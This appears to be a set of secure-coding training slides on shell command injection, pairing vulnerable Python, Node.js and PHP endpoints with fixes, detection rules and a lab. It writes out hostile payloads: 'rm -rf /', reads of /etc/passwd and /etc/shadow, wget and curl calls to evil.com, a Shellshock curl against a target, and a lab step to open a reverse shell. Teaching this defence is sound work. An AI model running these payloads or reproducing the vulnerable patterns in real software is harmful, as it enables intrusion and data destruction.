# Shell Injection: Defending Against Command Injection Attacks
---

## What is Shell Injection

- Shell injection, also known as command injection, is a type of web application security vulnerability.
- It occurs when user input is passed to system shell commands without proper validation or sanitization.
- Attackers can inject malicious code or commands into the system shell, leading to unauthorized access or code execution.
- Ranked in OWASP Top 10 as part of "Injection" vulnerabilities.

---

## How Shell Injection Works

1. The application takes user input (e.g., from a form field or URL parameter).
1. The user input is concatenated with a shell command without proper sanitization.
1. The resulting command is executed by the system shell.
1. If the user input contains malicious code or commands, they are executed with the same privileges as the application.

---

## Attack Flow Diagram

```text
┌──────────┐    ┌─────────────────┐    ┌──────────────┐    ┌──────────┐
│  Attacker │───>│  Web Application │───>│  System Shell │───>│  OS / FS  │
│           │    │                 │    │              │    │          │
│  Input:   │    │  Concatenates   │    │  Executes:   │    │  Files   │
│  ; cat    │    │  user input     │    │  ping host;  │    │  read,   │
│  /etc/    │    │  into command   │    │  cat /etc/   │    │  modified│
│  passwd   │    │  string         │    │  passwd      │    │  deleted │
└──────────┘    └─────────────────┘    └──────────────┘    └──────────┘
```

---

## Shell Metacharacters Used in Injection

| Character | Purpose                    | Example                        |
|-----------|----------------------------|--------------------------------|
| `;`       | Command separator          | `; rm -rf /`                   |
| `\|`      | Pipe output to command     | `\| cat /etc/passwd`           |
| `&&`      | Execute if previous succeeds| `&& wget evil.com/shell.sh`   |
| `\|\|`    | Execute if previous fails  | `\|\| curl evil.com/exfil`     |
| `` ` ` `` | Command substitution       | `` `whoami` ``                 |
| `$()`     | Command substitution       | `$(cat /etc/shadow)`           |
| `>`       | Redirect output to file    | `> /var/www/shell.php`         |
| `\n`      | Newline (new command)      | `%0a id`                       |

---

## Vulnerable Code Examples

### Python - Vulnerable

```python
import os
from flask import Flask, request

app = Flask(__name__)

# VULNERABLE: User input directly in shell command
@app.route('/ping')
def ping():
    host = request.args.get('host')
    # Attacker sends: host=8.8.8.8; cat /etc/passwd
    result = os.popen(f'ping -c 1 {host}').read()
    return f'<pre>{result}</pre>'

# VULNERABLE: Using shell=True with subprocess
@app.route('/lookup')
def lookup():
    domain = request.args.get('domain')
    # Attacker sends: domain=example.com; rm -rf /
    result = subprocess.check_output(
        f'nslookup {domain}', shell=True
    )
    return result
```

---

## Vulnerable Code: Node.js

```javascript
const express = require('express');
const { exec } = require('child_process');
const app = express();

// VULNERABLE: User input in exec() call
app.get('/dns', (req, res) => {
    const domain = req.query.domain;
    // Attacker sends: domain=example.com; cat /etc/passwd
    exec(`nslookup ${domain}`, (error, stdout, stderr) => {
        res.send(`<pre>${stdout}</pre>`);
    });
});

// VULNERABLE: Even with template literals
app.get('/file-info', (req, res) => {
    const filename = req.query.name;
    // Attacker sends: name=test.txt; whoami
    exec(`stat ${filename}`, (error, stdout) => {
        res.send(`<pre>${stdout}</pre>`);
    });
});
```

---

## Vulnerable Code: PHP

```php
<?php
// VULNERABLE: User input in system() call
$ip = $_GET['ip'];
// Attacker sends: ip=8.8.8.8; cat /etc/passwd
$output = shell_exec("ping -c 1 " . $ip);
echo "<pre>$output</pre>";

// VULNERABLE: Using backticks
$domain = $_GET['domain'];
$result = `nslookup $domain`;
echo "<pre>$result</pre>";
?>
```

---

## Secure Code: Python

```python
import subprocess
import re
from flask import Flask, request, abort

app = Flask(__name__)

# SECURE: Use subprocess with list arguments (no shell)
@app.route('/ping')
def ping():
    host = request.args.get('host', '')

    # Validate input: only allow valid hostnames/IPs
    if not re.match(r'^[a-zA-Z0-9.\-]+$', host):
        abort(400, 'Invalid hostname')

    # Use list form - no shell interpretation
    try:
        result = subprocess.run(
            ['ping', '-c', '1', '-W', '3', host],
            capture_output=True,
            text=True,
            timeout=5
        )
        return f'<pre>{result.stdout}</pre>'
    except subprocess.TimeoutExpired:
        abort(504, 'Request timed out')

# SECURE: Use library functions instead of shell commands
@app.route('/lookup')
def lookup():
    import socket
    domain = request.args.get('domain', '')
    if not re.match(r'^[a-zA-Z0-9.\-]+$', domain):
        abort(400, 'Invalid domain')
    try:
        ip = socket.gethostbyname(domain)
        return f'Domain {domain} resolves to {ip}'
    except socket.gaierror:
        abort(404, 'Domain not found')
```

---

## Secure Code: Node.js

```javascript
const express = require('express');
const { execFile } = require('child_process');
const dns = require('dns');
const app = express();

// SECURE: Use execFile (no shell interpretation)
app.get('/ping', (req, res) => {
    const host = req.query.host;

    // Validate input
    if (!/^[a-zA-Z0-9.\-]+$/.test(host)) {
        return res.status(400).send('Invalid hostname');
    }

    // execFile does NOT invoke a shell
    execFile('ping', ['-c', '1', host], (error, stdout) => {
        res.send(`<pre>${stdout}</pre>`);
    });
});

// SECURE: Use native DNS module instead of shell
app.get('/dns', (req, res) => {
    const domain = req.query.domain;
    if (!/^[a-zA-Z0-9.\-]+$/.test(domain)) {
        return res.status(400).send('Invalid domain');
    }
    dns.resolve(domain, (err, addresses) => {
        if (err) return res.status(404).send('Not found');
        res.json({ domain, addresses });
    });
});
```

---

## Potential Impacts of Shell Injection

- Unauthorized access to the system or application
- Data theft or data tampering
- System compromise and remote code execution
- Denial of Service (DoS) attacks
- Pivoting to other systems or escalating privileges

---

## Real-World Case Studies

| Incident               | Year | Details                                    |
|------------------------|------|--------------------------------------------|
| Shellshock (Bash bug)  | 2014 | CVE-2014-6271, env variable injection      |
| Equifax breach         | 2017 | Apache Struts command injection (partial)   |
| Cisco Smart Install    | 2018 | Remote command execution via protocol abuse |
| GitLab ExifTool        | 2021 | CVE-2021-22205, RCE via image upload        |

---

## Shellshock Deep Dive (CVE-2014-6271)

```bash
# The Shellshock vulnerability allowed code execution
# through Bash environment variables

# Vulnerable Bash interpreted function definitions
# in environment variables AND executed trailing commands

# Test if bash is vulnerable (DO NOT run on production):
# env x='() { :;}; echo VULNERABLE' bash -c "echo test"
# If it prints "VULNERABLE", the system is affected

# Attack vector via CGI scripts:
# curl -H "User-Agent: () { :;}; /bin/cat /etc/passwd" \
#     http://target.com/cgi-bin/script.sh

# The web server passed HTTP headers as environment
# variables to CGI scripts running under Bash
```

```text
┌───────────────────────────────────────────────────────┐
│              Shellshock Attack Flow                     │
│                                                       │
│  Attacker ──> HTTP Request with malicious header      │
│                    │                                  │
│                    v                                  │
│  Web Server (Apache/nginx with CGI)                   │
│       │  Passes headers as env variables              │
│       v                                              │
│  Bash Shell: env USER_AGENT='() { :;}; malicious'    │
│       │  Bash parses function AND executes trailing   │
│       v                                              │
│  Malicious command runs with web server privileges    │
└───────────────────────────────────────────────────────┘
```

---

## Defending Against Shell Injection

- Input validation and sanitization
- Avoid shell command execution
- Use secure APIs and libraries
- Implement principle of least privilege
- Keep systems and software up-to-date
- Monitor and log application activities

---

## Input Validation and Sanitization

- Validate and sanitize all user input before using it in shell commands.
- Use allowlists (whitelists) or blocklists (blacklists) to filter input.
- Escape or encode special characters and meta-characters.
- Use context-aware output encoding when rendering user input.

---

## Input Validation Strategies

```python
import re
import shlex

# Strategy 1: Allowlist validation (BEST)
def validate_hostname(host):
    """Only allow valid hostnames"""
    pattern = r'^[a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?(\.[a-zA-Z]{2,})+$'
    return bool(re.match(pattern, host))

# Strategy 2: Shell escaping (if shell is unavoidable)
def safe_shell_arg(user_input):
    """Escape for shell - use as LAST RESORT"""
    return shlex.quote(user_input)
    # shlex.quote("hello; rm -rf /")
    # returns: "'hello; rm -rf /'"

# Strategy 3: Parameterized execution (PREFERRED)
import subprocess
def safe_ping(host):
    """No shell involved - arguments are a list"""
    if not validate_hostname(host):
        raise ValueError("Invalid hostname")
    return subprocess.run(
        ['ping', '-c', '1', host],
        capture_output=True, text=True
    )
```

---

## Avoiding Shell Command Execution

- Avoid using shell commands or external processes whenever possible.
- Utilize language-specific APIs and libraries for system operations.
- If shell commands are necessary, use secure execution methods with proper input sanitization.

---

## Language-Specific Alternatives to Shell Commands

| Shell Command      | Python Alternative                 | Node.js Alternative        |
|-------------------|------------------------------------|----------------------------|
| `ping`            | `subprocess.run(['ping',...])`     | `execFile('ping',[...])`   |
| `nslookup`        | `socket.gethostbyname()`          | `dns.resolve()`            |
| `curl`            | `requests.get()`                  | `fetch()` / `axios.get()`  |
| `ls`              | `os.listdir()`                    | `fs.readdir()`             |
| `cat`             | `open().read()`                   | `fs.readFile()`            |
| `grep`            | `re.search()`                     | `string.match()`           |
| `cp` / `mv`       | `shutil.copy()` / `shutil.move()` | `fs.copyFile()`            |

---

## Secure APIs and Libraries

- Use secure APIs and libraries for system operations and command execution.
- Leverage language-specific features for input validation and sanitization.
- Follow secure coding practices and guidelines for the language and framework.

---

## Principle of Least Privilege

- Run applications and processes with the minimum required privileges.
- Implement access controls and permissions to limit the impact of a potential compromise.
- Avoid running applications or processes with root/admin privileges.

---

## Containment with Sandboxing

```bash
# Run application in a restricted environment

# AppArmor profile to restrict shell access
# /etc/apparmor.d/usr.bin.webapp
# /usr/bin/webapp {
#   deny /bin/sh x,
#   deny /bin/bash x,
#   deny /usr/bin/python* x,
# }

# Use seccomp to restrict system calls
# Prevent execve() syscall entirely

# Docker: run without shell access
# Dockerfile
# FROM scratch
# COPY myapp /myapp
# ENTRYPOINT ["/myapp"]
# No shell available in container!

# Linux namespaces for isolation
unshare --mount --pid --fork --mount-proc /bin/bash
```

---

## Software Updates and Patching

- Keep systems, applications, and third-party dependencies up-to-date with the latest security patches.
- Subscribe to security advisories and promptly apply updates and patches.
- Establish a robust patch management process.

---

## Monitoring and Logging

- Implement application monitoring and logging mechanisms.
- Log and audit user inputs, system commands, and application activities.
- Deploy security information and event management (SIEM) solutions.
- Regularly review logs and establish incident response procedures.

---

## Detection Techniques

```bash
# Monitor for command injection attempts in web logs
grep -E "(;|&&|\|\||`|\$\()" /var/log/nginx/access.log

# Look for suspicious process spawning from web server
# Using auditd rules:
auditctl -a always,exit -F arch=b64 -S execve \
    -F uid=www-data -k web_cmd_exec

# Search audit logs for web server executing commands
ausearch -k web_cmd_exec --start today

# ModSecurity WAF rules for command injection
# SecRule ARGS "@rx [;|&`$()]" \
#     "id:1001,deny,status:403,msg:'Command Injection'"
```

```text
┌──────────────────────────────────────────────────┐
│        Detection Indicators                      │
├──────────────────────────────────────────────────┤
│  - Web server process spawning /bin/sh           │
│  - HTTP parameters containing ; | & ` $( )      │
│  - Unusual outbound connections from web server  │
│  - Web server reading /etc/passwd or /etc/shadow │
│  - DNS lookups to unusual domains from web proc  │
│  - File creation in /tmp by web server process   │
└──────────────────────────────────────────────────┘
```

---

## Security Testing and Code Reviews

- Conduct regular security testing, including penetration testing and code reviews.
- Identify and remediate potential shell injection vulnerabilities.
- Implement secure coding practices and follow security best practices.

---

## Automated Testing for Command Injection

```bash
# Using commix - automated command injection tool
# (for authorized penetration testing only)
# commix --url="http://target.com/ping?host=INJECT_HERE"

# Using OWASP ZAP for automated scanning
# zap-cli active-scan http://target.com

# Static analysis with Bandit (Python)
pip install bandit
bandit -r myapp/ -t B602,B603,B604,B605,B606,B607
# B602: subprocess with shell=True
# B603: subprocess without shell
# B604: any_other_function_with_shell_equals_true
# B605: start_process_with_a_shell
# B606: start_process_with_no_shell
# B607: start_process_with_partial_path

# Static analysis with Semgrep
semgrep --config "p/command-injection" myapp/
```

---

## User Awareness and Training

- Educate developers, administrators, and users about shell injection risks.
- Promote security awareness and secure coding practices.
- Foster a culture of security and responsibility.

Defending against shell injection attacks requires a multi-layered approach, including input validation, secure coding practices, least privilege principles, software updates, monitoring, and security awareness.

---

## Exercise: Shell Injection Lab

1. Set up a vulnerable Flask application with a ping endpoint:
   - Accept a hostname parameter
   - Execute `ping` using `os.popen()`
2. Demonstrate injection using various metacharacters (`;`, `|`, `&&`)
3. Attempt to:
   - Read `/etc/passwd`
   - Create a file in `/tmp`
   - Establish a reverse shell
4. Fix the application using:
   - Input validation with allowlist regex
   - `subprocess.run()` with list arguments
   - `shlex.quote()` as a fallback
5. Verify the fix prevents all previous injection attempts
6. Set up ModSecurity WAF rules as an additional defense layer
